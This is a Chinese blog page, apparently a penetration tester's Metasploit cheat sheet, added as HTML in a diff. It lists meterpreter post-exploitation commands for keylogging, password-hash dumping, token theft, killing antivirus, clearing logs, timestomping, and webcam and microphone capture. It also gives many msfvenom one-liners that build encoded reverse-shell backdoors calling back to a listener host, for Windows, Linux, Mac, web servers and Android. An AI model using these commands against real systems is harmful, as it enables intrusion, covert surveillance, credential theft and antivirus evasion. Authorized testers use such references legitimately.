@@ -1,0 +1,227 @@
+<!DOCTYPE HTML>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>MSF之命令笔记篇 | sh1yan&#39;blog</title>
+
+  
+  <meta name="author" content="shiyan">
+  
+
+  
+  <meta name="description" content="信息安全|网络安全|渗透测试|代码审计|安全审计">
+  
+
+  
+  
+  <meta name="keywords" content="metasploit">
+  
+
+  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+  <meta property="og:title" content="MSF之命令笔记篇">
+
+  <meta property="og:site_name" content="sh1yan&#39;blog">
+
+  
+  <meta property="og:image" content="/favicon.ico">
+  
+
+  <link href="/favicon.ico" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="sh1yan&#39;blog" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+</head>
+
+
+<body>
+<div class="blog">
+  <div class="content">
+
+    <header>
+  <div class="site-branding">
+    <h1 class="site-title">
+      <a href="/">sh1yan&#39;blog</a>
+    </h1>
+    <p class="site-description"></p>
+  </div>
+  <nav class="site-navigation">
+    <ul>
+      
+        <li><a href="/">主页</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+        <li><a href="/about">关于</a></li>
+      
+        <li><a href="/yqlj">友链</a></li>
+      
+        <li><a href="/atom.xml">订阅</a></li>
+      
+    </ul>
+  </nav>
+</header>
+
+    <main class="site-main posts-loop">
+    <article>
+
+  
+    
+    <h3 class="article-title"><span>MSF之命令笔记篇</span></h3>
+    
+  
+  
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2019/07/28/MSF-Command-Notes/" rel="bookmark">
+        <time class="entry-date published" datetime="2019-07-28T15:50:55.000Z">
+          2019-07-28
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <p><strong>0x00 一键式安装</strong></p>
+<p>Ubuntu-System</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /opt</span><br><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; \</span><br><span class="line">chmod <span class="number">755</span> msfinstall &amp;&amp; \</span><br><span class="line">./msfinstall</span><br></pre></td></tr></table></figure>
+<a id="more"></a>
+<p>Termux-System</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ～</span><br><span class="line">pkg install wget</span><br><span class="line">wget https://Auxilus.github.io/metasploit.sh</span><br><span class="line">bash metasploit.sh</span><br></pre></td></tr></table></figure>
+<p>OR</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pkg install unstable-repo</span><br><span class="line">pkg install metasploit</span><br></pre></td></tr></table></figure>
+<p>Win10_Kali-System</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">powershell管理员模式下输入：</span><br><span class="line">Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux</span><br><span class="line">kali命令行下输入：</span><br><span class="line">sudo apt-get install metasploit-framework</span><br></pre></td></tr></table></figure>
+<p><strong>0x01 常用命令①</strong></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">show exploits 			– 查看所有可用的渗透攻击程序代码 </span><br><span class="line">show auxiliary 			– 查看所有可用的辅助攻击工具 </span><br><span class="line">show options 			– 查看该模块所有可用选项 </span><br><span class="line">show payloads 			– 查看该模块适用的所有载荷代码 </span><br><span class="line">show targets 			– 查看该模块适用的攻击目标类型</span><br><span class="line"></span><br><span class="line">back（返回）：          从目前的情况下向后移动</span><br><span class="line"><span class="built_in">cd</span>：                   改变当前的工作目录</span><br><span class="line"><span class="built_in">color</span>：                切换颜色</span><br><span class="line">connect（远程连接）：    与主机通信</span><br><span class="line"><span class="keyword">exit</span> （退出命令行）：    退出控制台</span><br><span class="line"></span><br><span class="line"><span class="built_in">help</span>（帮助） ：             帮助菜单</span><br><span class="line">info（获取模块信息）：       关于一个或多个模块显示信息</span><br><span class="line">irb：                     进入irb脚本模式</span><br><span class="line">jobs：                    显示和管理职位</span><br><span class="line">kill（结束进程）：          结束一个进程</span><br><span class="line">load （加载）：            加载一个框架插件</span><br><span class="line">loadpath ：               搜索和负载从一个路径模块</span><br><span class="line">makerc：                  保存自开始进入到一个文件中的命令</span><br><span class="line">popm：                    弹出最新的模块从堆栈中并使其活跃</span><br><span class="line">previous ：               将以前加载模块作为当前模块</span><br><span class="line">pushm ：                  推主动或模块列表在模块栈</span><br><span class="line">quit （退出控制台）：       退出控制台</span><br><span class="line">reload_all Reloads ：     从所有定义的模块路径的所有模块</span><br><span class="line">rename_job ：             重命名工作</span><br><span class="line">resource ：               运行存储命令在文件</span><br><span class="line">route ：                  通过会话路由流量</span><br><span class="line">save：                    将数据存储主动</span><br><span class="line">search（搜索exp等模块关键字）： 搜索模块的名称和说明</span><br><span class="line">sessions（会话功能）：      转储会话列表和显示有关会话的信息</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> （设置参数）：              设置一个特定的上下文变量的值</span><br><span class="line">setg（全局设置参数）：           设置一个全局变量的值</span><br><span class="line">show （展示参数模块）：          给定类型的显示模块或所有模块</span><br><span class="line">spool ：                      写控制台输出到一个文件以及屏幕</span><br><span class="line">threads ：                    查看和操作后台线程</span><br><span class="line">unload （卸载某个插件）：        卸载一个框架插件</span><br><span class="line">unset （删除某个设置参数）：      取消设置一个或多个特定的上下文变量</span><br><span class="line">unsetg （取消全局某个设置参数）：  取消设置一个或多个全局变量的</span><br><span class="line">use （使用某个模块）：           选择按名称模块</span><br><span class="line">version（查看版本信息）：        显示的框架和控制台库版本号</span><br></pre></td></tr></table></figure>
+<p><strong>0x02 常用命令②</strong></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">background ：         进程隐藏至后台</span><br><span class="line">Sysinfo ：            系统平台信息</span><br><span class="line">screenshot ：         屏幕截取</span><br><span class="line">shell ：              命令行shell (<span class="keyword">exit</span>退出)</span><br><span class="line">ls ：                 查看文件目录列表</span><br><span class="line">rm ：                 删除文件 </span><br><span class="line">cat :                 查看目标文件</span><br><span class="line">getwd :               获取目标机当前工作目录,getlwd本地当前工作工作目录</span><br><span class="line">edit （编辑）：         编辑与$ VISUAL或$ EDITOR当前模块的</span><br><span class="line"></span><br><span class="line">download C:\\Users\\<span class="number">123</span>\\Desktop\\<span class="number">1</span>.txt <span class="number">1</span>.txt ：    下载文件</span><br><span class="line">upload /var/www/lcx.exe lcx.exe   ：                上传文件</span><br><span class="line">search -d c:  -f *.doc  ：               搜索文件</span><br><span class="line">execute -f  <span class="built_in">cmd</span>.exe -i   ：              执行程序/命令 </span><br><span class="line">ps  ：                                   查看进程</span><br><span class="line">run post/windows/capture/keylog_recorder ：          键盘记录</span><br><span class="line">getuid  ：                               查看当前用户权限</span><br><span class="line">use priv  ：                             加载特权模块</span><br><span class="line">getsystem   ：                           提升到SYSTEM权限</span><br><span class="line">hashdump  ：                             导出密码散列</span><br><span class="line">steal_token &lt;PID&gt;  ：                    窃取令牌</span><br><span class="line">rev2self  ：                             恢复原来的令牌 </span><br><span class="line">migrate pid  ：                          迁移进程</span><br><span class="line">run killav  ：                           关闭杀毒软件 </span><br><span class="line">run getgui-e                             启用远程桌面</span><br><span class="line">portfwd add -l <span class="number">1234</span> -p <span class="number">3389</span> -r &lt;目标IP&gt;  ： 端口转发</span><br><span class="line">run get_local_subnets  ：                获取内网网段信息</span><br><span class="line">run autoroute -s &lt;内网网段&gt;  ：           创建自动路由</span><br><span class="line">run autoroute -p  ：                     查看自动路由表</span><br></pre></td></tr></table></figure>
+<p><strong>0x03 常用命令③</strong></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt;clearev              清除日志</span><br><span class="line">meterpreter&gt;webcam_list          查看目标是否有摄像头</span><br><span class="line">meterpreter&gt;webcam_snap          连接摄像头拍摄照片</span><br><span class="line">meterpreter&gt;webcam_stream        用摄像头录像</span><br><span class="line">meterpreter&gt;getprivs             查看当前权限</span><br><span class="line">meterpreter&gt;keyscan_start/stop   开始/关闭键盘记录</span><br><span class="line">meterpreter&gt;keyscan_dump         获取键盘记录内容</span><br><span class="line">meterpreter&gt;record_mic           录音</span><br><span class="line">meterpreter&gt;run post/windows/manage/enable_rdp 开启 <span class="number">3389</span> 端口</span><br><span class="line">meterpreter&gt;idletime             查看目标机闲置时间</span><br><span class="line">meterpreter&gt;uictl disable mouse  禁用鼠标</span><br><span class="line">meterpreter&gt;uictl disable keyboard  禁用键盘</span><br><span class="line">meterpreter&gt;getproxy             查看代理信息</span><br><span class="line">meterpreter&gt;run autoroute -s <span class="number">192</span>.<span class="number">168</span>.<span class="number">159</span>.<span class="number">0</span>/<span class="number">24</span>     添加到目标环境网络</span><br><span class="line">meterpreter&gt;run autoroute –p     查看添加的路由</span><br><span class="line">meterpreter&gt;run post/windows/gather/checkvm       是否 windows 虚拟机</span><br><span class="line">meterpreter&gt;run post/linux/gather/checkvm         是否 linux 虚拟机</span><br><span class="line">meterpreter&gt;run post/windows/gather/enum_patches  补丁信息</span><br><span class="line">meterpreter&gt;idletime             查看目标机闲置时间</span><br><span class="line">meterpreter&gt;reboot / shutdown    重启或关闭主机</span><br><span class="line">meterpreter&gt;timestomp -v C://<span class="number">2</span>.txt                查看时间戳</span><br><span class="line">meterpreter&gt;timestomp C://<span class="number">2</span>.txt -f C://<span class="number">1</span>.txt      将 <span class="number">1</span>.txt 的时间戳复制给 <span class="number">2</span>.txt</span><br></pre></td></tr></table></figure>
+<p><strong>0x04 通用使用流程</strong></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">第一步：      search name 模块 </span><br><span class="line">第二步：      use name 模块 </span><br><span class="line">第三步：      info 查看模块信息 </span><br><span class="line">第四步：      show payloads 查看该模块可以使用的攻击载荷（为scanner的时候不需要） </span><br><span class="line">第五步：      <span class="built_in">set</span> payload 载荷 </span><br><span class="line">第六步：      show targets 查看该攻击载荷使用的系统类型（为scanner的时候不需要） </span><br><span class="line">第七步：      <span class="built_in">set</span> targets num 设置目标的系统类型 </span><br><span class="line">第八步：      show options 查看需要设置的参数show advanced 列出所有高级配置选项 </span><br><span class="line">第九步：      <span class="built_in">set</span> name 设置参数 </span><br><span class="line">第十步：      exploit（为scanner 时用run） </span><br><span class="line">第十一步：     session –l –v列出所有可用的交互会话以及详细信息</span><br></pre></td></tr></table></figure>
+<p><strong>0x05 设置监听</strong></p>
+<p>所有监听模块：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Windows</span><br><span class="line">windows/meterpreter/reversetcp</span><br><span class="line">windows/meterpreter/bind_tcp</span><br><span class="line">windows/meterpreter/reverse_hop_http</span><br><span class="line">windows/meterpreter/reverse_http</span><br><span class="line">windows/meterpreter/reverse_http_proxy_pstore</span><br><span class="line">windows/meterpreter/reverse_https</span><br><span class="line">windows/meterpreter/reverse_https_proxy</span><br><span class="line">windows/shell_reverse_tcp</span><br><span class="line">windows/shell_bind_tcp</span><br><span class="line">windows/x64/meterpreter/reverse_tcp</span><br><span class="line">windows/x64/meterpreter/bind_tcp</span><br><span class="line">windows/x64/shell_reverse_tcp</span><br><span class="line">windows/x64/shell_bind_tcp</span><br><span class="line"></span><br><span class="line">Linux</span><br><span class="line">linux/x86/meterpreter/reverse_tcp</span><br><span class="line">linux/x86/meterpreter/bind_tcp</span><br><span class="line">linux/x86/shell_bind_tcp</span><br><span class="line">linux/x86/shell_reverse_tcp</span><br><span class="line">linux/x64/shell/bind_tcp</span><br><span class="line">linux/x64/shell/reverse_tcp</span><br><span class="line">linux/x64/shell_bind_tcp</span><br><span class="line">linux/x64/shell_bind_tcp_random_port</span><br><span class="line">linux/x64/shell_reverse_tcp</span><br></pre></td></tr></table></figure>
+<p>设置监听流程：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(handler) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; show options</span><br><span class="line"></span><br><span class="line">msf exploit(handler) &gt; <span class="built_in">set</span> LHOST 本机IP地址</span><br><span class="line">msf exploit(handler) &gt; <span class="built_in">set</span> LPORT 监听端口</span><br><span class="line">msf exploit(handler) &gt; exploit -j -z  </span><br><span class="line">-j(计划任务下进行攻击，后台) -z(攻击完成不遇会话交互)</span><br><span class="line">msf exploit(handler) &gt; jobs  查看后台攻击任务 </span><br><span class="line">msf exploit(handler) &gt; kill &lt;id&gt;  停止某后台攻击任务 </span><br><span class="line">msf exploit(handler) &gt; sessions -l  (查看会话)</span><br><span class="line"></span><br><span class="line">msf exploit(handler) &gt; sessions -i <span class="number">2</span>   选择会话</span><br><span class="line">msf exploit(handler) &gt; sessions -k <span class="number">2</span>   结束会话</span><br></pre></td></tr></table></figure>
+<p><strong>0x06 生成反弹木马</strong></p>
+<p>默认参数：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">-p        指定要使用的 msf 的 payload,也可以使用自定义 payload。</span><br><span class="line">-l        列出所有可用的所有可用资源. 模块类型包括: payloads, encoders, nops等。</span><br><span class="line">-n        为 payload 预先指定一个 NOP 滑动长度（一切为了绕过防火墙与免杀）。</span><br><span class="line">-f        指定 payload 输出的文件类型,--<span class="built_in">help</span>-formats,可查看支持的所有输出格式(默认的输出格式是 raw,直接输出 payload 的字符，含乱码之类)。</span><br><span class="line">-e        指定要使用编码器。</span><br><span class="line">-a        指定 payload 的目标架构,如 windows 系统的 x64，x86。</span><br><span class="line">--platform        有效载荷的平台，如 windows 系统等。</span><br><span class="line">-s        设定有效攻击荷载的最大长度，简单说就是生成的后门的字节数。</span><br><span class="line">-b        指定坏字符,比如空字符截断问题等，导致后门无法运行。</span><br><span class="line">-i        指定编码的次数,如果使用编码器。</span><br><span class="line">-c        指定一个附加的 win32 shellcode 文件指定一个自定义的可执行文件作为模板。</span><br><span class="line">-x        使用一个自定义可执行程序模板,并将 payload 嵌入其中</span><br><span class="line">-k        当模板被执行时,payload 自动分离并注入到新的进程中,一般和-x 选项一并使用。</span><br><span class="line">-o        指定创建好的 payload 的存放位置</span><br><span class="line">-v        指定一个自定义的变量，以确定输出格式</span><br></pre></td></tr></table></figure>
+<p>生成shell命令：</p>
+<p><u>Linux:</u></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br><span class="line"></span><br><span class="line">msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=<span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">226</span> LPORT=<span class="number">8888</span> -f elf -o x86_linux.elf</span><br><span class="line"></span><br><span class="line">msfvenom -a x64 --platform Linux -p linux/x64/meterpreter/reverse_tcp LHOST=<span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">226</span> LPORT=<span class="number">8888</span> -f elf -o x6_4linux.elf</span><br></pre></td></tr></table></figure>
+<p><u>Windows:</u></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</span><br><span class="line"></span><br><span class="line">msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=<span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">226</span> LPORT=<span class="number">8888</span> -f exe -o x64shell.exe</span><br><span class="line"></span><br><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=<span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">226</span> LPORT=<span class="number">8888</span> -f exe -o x86_shell.exe</span><br><span class="line">(<span class="number">32</span> 程序也可在 <span class="number">64</span> 位系统运行)</span><br><span class="line"></span><br><span class="line">msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=<span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">226</span> LPORT=<span class="number">8888</span> -e x86/shikata_ga_nai -b '\x00\x0a\xff' -i <span class="number">3</span> -f exe -o payload.exe</span><br><span class="line"></span><br><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=<span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">226</span> LPORT=<span class="number">6666</span> -a x86 --platform Windows -f dll &gt;x86.dll</span><br><span class="line"></span><br><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=<span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">226</span> LPORT=<span class="number">6666</span> --platform Windows -f dll &gt;x64.dll</span><br></pre></td></tr></table></figure>
+<p><u>Mac:</u></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</span><br><span class="line"></span><br><span class="line">msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=<span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">226</span> LPORT=<span class="number">8888</span> -f macho -o payload.macho</span><br></pre></td></tr></table></figure>
+<p><u>PHP:</u></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php </span><br><span class="line">cat shell.php | pbcopy &amp;&amp; <span class="built_in">echo</span> '&lt;?php ' | tr -d '\n' &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br></pre></td></tr></table></figure>
+<p><u>ASP:</u></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure>
+<p><u>JSP:</u></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</span><br><span class="line"></span><br><span class="line">msfvenom --platform java -p java/jsp_shell_reverse_tcp LHOST=<span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">226</span> LPORT=<span class="number">8888</span> -f raw -o payload.jsp</span><br></pre></td></tr></table></figure>
+<p><u>WAR:</u></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</span><br><span class="line"></span><br><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=<span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">226</span> LPORT=<span class="number">8888</span> -f raw -o payload.war</span><br></pre></td></tr></table></figure>
+<p><u>Python:</u></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p <span class="built_in">cmd</span>/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</span><br><span class="line"></span><br><span class="line">msfvenom -p python/meterpreter/reverse_tcp LHOST=<span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">226</span> LPORT=<span class="number">8888</span> -f raw -o shell.py</span><br></pre></td></tr></table></figure>
+<p><u>Bash:</u></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p <span class="built_in">cmd</span>/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</span><br></pre></td></tr></table></figure>
+<p><u>Perl:</u></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p <span class="built_in">cmd</span>/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</span><br><span class="line"></span><br><span class="line">msfvenom -p <span class="built_in">cmd</span>/unix/reverse_perl LHOST=<span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">226</span> LPORT=<span class="number">8888</span> -f raw -o payload.pl</span><br></pre></td></tr></table></figure>
+<p><u>Powershell:</u></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -e <span class="built_in">cmd</span>/powershell_base64 -i <span class="number">3</span> -f raw -o payload.ps1</span><br><span class="line"></span><br><span class="line">msfvenom -a x86 --platform windows -p windows/powershell_reverse_tcp LHOST=<span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">226</span> LPORT=<span class="number">8888</span> -e <span class="built_in">cmd</span>/powershell_base64 -i <span class="number">3</span> -f raw -o x86_shell.ps1</span><br><span class="line"></span><br><span class="line">msfvenom -a x64 --platform windows -p windows/x64/powershell_reverse_tcp LHOST=<span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">226</span> LPORT=<span class="number">8888</span> -e <span class="built_in">cmd</span>/powershellbase64 -i <span class="number">3</span> -f raw -o x64_shell.ps1</span><br></pre></td></tr></table></figure>
+<p><u>Android:</u></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Android -p android/meterpreter/reverse_tcp LHOST=<span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">226</span> LPORT=<span class="number">8888</span> -f apk -o payload.apk</span><br></pre></td></tr></table></figure>
+<p><u>Aspx:</u></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=<span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">226</span> LPORT=<span class="number">8888</span> -f aspx -o payload.aspx</span><br></pre></td></tr></table></figure>
+<p><u>Nodejs:</u></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p nodejs/shell_reverse_tcp LHOST=<span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">226</span> LPORT=<span class="number">8888</span> -f raw -o payload.js</span><br></pre></td></tr></table></figure>
+<p><u>Ruby:</u></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p ruby/shell_reverse_tcp LHOST=<span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">226</span> LPORT=<span class="number">8888</span> -f raw -o payload.rb</span><br></pre></td></tr></table></figure>
+<p><u>Lua:</u></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p <span class="built_in">cmd</span>/unix/reverse_lua LHOST=<span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">226</span> LPORT=<span class="number">8888</span> -f raw -o payload.lua</span><br></pre></td></tr></table></figure>
+<p><u>Windows Shellcode:</u></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=<span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">226</span> LPORT=<span class="number">8888</span> -f c</span><br></pre></td></tr></table></figure>
